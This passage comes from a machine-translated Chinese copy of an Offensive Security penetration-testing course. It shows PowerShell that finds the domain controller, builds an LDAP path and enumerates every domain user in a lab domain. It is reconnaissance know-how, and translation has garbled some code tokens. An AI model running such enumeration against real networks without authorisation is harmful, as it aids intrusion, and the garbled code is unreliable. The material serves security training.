<div style="position:absolute;top:11593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的脚本将以非常具体的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP 提供程序路径</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">614</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为</font><font style="vertical-align: inherit;">中心，该</font><i><font style="vertical-align: inherit;">路径</font></i><font style="vertical-align: inherit;">将用作</font></font></nobr></div>
<div style="position:absolute;top:11613;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectorySearcher</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .NET 类。</font><font style="vertical-align: inherit;">路径的原型如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:11648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://HostName[:PortNumber][/DistinguishedName]</font></font></nobr></div>
<div style="position:absolute;top:11667;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 665 - LDAP 提供程序路径格式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:11696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要创建此路径，我们需要目标</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在本例中是域的名称</font></font></nobr></div>
<div style="position:absolute;top:11716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制器）和域的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DistinguishedName</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (DN) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">615</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，具有特定的命名标准</font></font></nobr></div>
<div style="position:absolute;top:11735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于特定的域组件 (DC)。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:11807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">609 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://technet.microsoft.com/en-us/library/gg413289.aspx</font></font></font></nobr></div>
<div style="position:absolute;top:11827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">610 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2014 年），https://support.microsoft.com/en-gb/help/197132/active-directory-fsmo-roles-in-windows</font></font></font></nobr></div>
<div style="position:absolute;top:11847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">611 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/system.directoryservices.directorysearcher </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.110).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:11867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">612 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/aa367008 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:11887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">613 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/aa772170 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:11907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">614 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/aa746384 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:11927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">615 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/aa366101 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:12055;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="11"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 11 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12088;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:13165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:13165;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:13165;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">628</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们发现域控制器的主机名和域控制器的组件</font></font></nobr></div>
<div style="position:absolute;top:12203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 PowerShell 命令的 DistinguishedName。</font></font></nobr></div>
<div style="position:absolute;top:12236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具体而言，我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">616</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.DirectoryServices.ActiveDirectory</font></font></i></nobr></div>
<div style="position:absolute;top:12255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命名空间。</font><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的类包含一个称为方法</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GetCurrentDomain</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">617</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以检索</font></font></nobr></div>
<div style="position:absolute;top:12275;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前登录用户的</font><i><font style="vertical-align: inherit;">域</font></i><font style="vertical-align: inherit;">对象。</font></font></nobr></div>
<div style="position:absolute;top:12308;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GetCurrentDomain</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法的</font><font style="vertical-align: inherit;">调用</font><font style="vertical-align: inherit;">及其输出显示在下面的列表中：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec.CORP&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:12359;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域（）</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">森林    </font></font></nobr></div>
<div style="position:absolute;top:12410;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: corp.com</font></font></nobr></div>
<div style="position:absolute;top:12427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器：{DC01.corp.com}</font></font></nobr></div>
<div style="position:absolute;top:12444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">孩子们    </font></font></nobr></div>
<div style="position:absolute;top:12444;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：{}</font></font></nobr></div>
<div style="position:absolute;top:12461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域模式    </font></font></nobr></div>
<div style="position:absolute;top:12461;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 未知</font></font></nobr></div>
<div style="position:absolute;top:12478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域模式级别    </font></font></nobr></div>
<div style="position:absolute;top:12478;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 7</font></font></nobr></div>
<div style="position:absolute;top:12495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家长    </font></font></nobr></div>
<div style="position:absolute;top:12495;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">： </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:12512;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">角色所有者    </font></font></b></nobr></div>
<div style="position:absolute;top:12512;left:303"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: DC01.corp.com</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">角色所有者    </font></font></nobr></div>
<div style="position:absolute;top:12529;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: DC01.corp.com</font></font></nobr></div>
<div style="position:absolute;top:12546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">InfrastructureRoleOwner : DC01.corp.com</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:12563;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></b></nobr></div>
<div style="position:absolute;top:12563;left:303"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: corp.com</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12582;left:212"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 666 - System.DirectoryServices.ActiveDirectory 命名空间中的域类</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据此输出，域名为“corp.com”（来自</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Name</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性），并且主</font><font style="vertical-align: inherit;">域名为</font></font></nobr></div>
<div style="position:absolute;top:12631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器名称是“DC01.corp.com”（来自</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PdcRoleOwner </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">618</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性）。</font></font></nobr></div>
<div style="position:absolute;top:12664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用此信息以编程方式构建 LDAP 提供程序路径。</font><font style="vertical-align: inherit;">让我们包括</font></font></nobr></div>
<div style="position:absolute;top:12683;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建提供程序路径的简单 PowerShell 脚本中的</font><i><font style="vertical-align: inherit;">Name</font></i><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PdcRoleOwner</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:12718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:12752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
<div style="position:absolute;top:12786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:12820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
<div style="position:absolute;top:12854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:12888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
<div style="position:absolute;top:12922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$搜索字符串</font></font></nobr></div>
<div style="position:absolute;top:12941;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 667 - 组装 LDAP 提供程序路径</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:12970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个脚本中，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将存储整个域对象，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将存储</font><i><font style="vertical-align: inherit;">PDC</font></i><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:12990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$ SearchString在</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将建立输出提供程序路径。</font><font style="vertical-align: inherit;">请注意，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DistinguishedName</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:13047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">616 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/system.directoryservices.activedirectory.domain </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.110).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:13067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">617 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://msdn.microsoft.com/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/library/system.directoryservices.activedirectory.domain.getcurrentdomain(v=vs.110).aspx</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:13101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">618 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://msdn.microsoft.com/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/library/system.directoryservices.activedirectory.domain.pdcoleowner(v=vs.110).aspx </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:13243;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="12"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:13276;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:14353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:14353;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:14353;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">629</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由我们的域名 ('corp.com') 组成，分为单独的域组件 (DC)，</font></font></nobr></div>
<div style="position:absolute;top:13391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使 DistinguishedName 为“DC=corp,DC=com”，如脚本输出所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://DC01.corp.com/DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:13445;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 668 - 完整的 LDAP 提供程序路径</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是对域控制器执行 LDAP 查询所需的完整 LDAP 提供程序路径。</font></font></nobr></div>
<div style="position:absolute;top:13508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们现在可以</font><font style="vertical-align: inherit;">使用 LDAP 提供程序路径</font><font style="vertical-align: inherit;">实例化</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectorySearcher</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类。</font><font style="vertical-align: inherit;">要使用</font></font></nobr></div>
<div style="position:absolute;top:13527;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectorySearcher</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类，我们必须指定一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SearchRoot</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它是 Active Directory 中的节点</font></font></nobr></div>
<div style="position:absolute;top:13546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索开始的层次结构。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">619</font></font></font></nobr></div>
<div style="position:absolute;top:13579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索根采用从</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectoryEntry </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">620</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类</font><font style="vertical-align: inherit;">实例化的对象的形式</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">当没有</font></font></nobr></div>
<div style="position:absolute;top:13598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数传递给构造函数，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SearchRoot</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将指示每个搜索都应该</font></font></nobr></div>
<div style="position:absolute;top:13618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从整个 Active Directory 返回结果。</font><font style="vertical-align: inherit;">清单 669 中的代码显示了</font></font></nobr></div>
<div style="position:absolute;top:13637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本来实现这一点。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:13706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
<div style="position:absolute;top:13740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:13774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
<div style="position:absolute;top:13808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:13842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:13876;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher = 新对象 System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)</font></font></b></nobr></div>
<div style="position:absolute;top:13909;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$objDomain = 新对象 System.DirectoryServices.DirectoryEntry</font></font></b></nobr></div>
<div style="position:absolute;top:13944;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:13963;left:334"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 669 - 创建 DirectorySearcher</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:13992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着我们</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的DirectorySearcher</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象准备好了，我们就可以进行搜索。</font><font style="vertical-align: inherit;">但是，在没有任何过滤器的情况下，我们</font></font></nobr></div>
<div style="position:absolute;top:14012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将接收整个域中的所有对象。</font></font></nobr></div>
<div style="position:absolute;top:14044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置过滤器的一种方法是通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">samAccountType</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">621</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是所有</font></font></nobr></div>
<div style="position:absolute;top:14064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户、计算机和组对象都有。</font><font style="vertical-align: inherit;">有关更多示例，</font><font style="vertical-align: inherit;">请参阅链接的参考文献</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">622</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:14083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但在我们的例子中，我们可以向过滤器属性提供 0x30000000（十进制 805306368）来枚举</font></font></nobr></div>
<div style="position:absolute;top:14103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域中的所有用户，如清单 670 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:14137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:14171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:14243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">619 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/y49s2h23 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.110).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:14263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">620 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/system.directoryservices.directoryentry </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.110).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:14283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">621 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/ms679637 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:14303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">622 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/ms679637 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:14431;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="13"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 13 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:14464;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:15541;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:15541;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:15541;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">630</font></font></nobr></div>
</span></font>
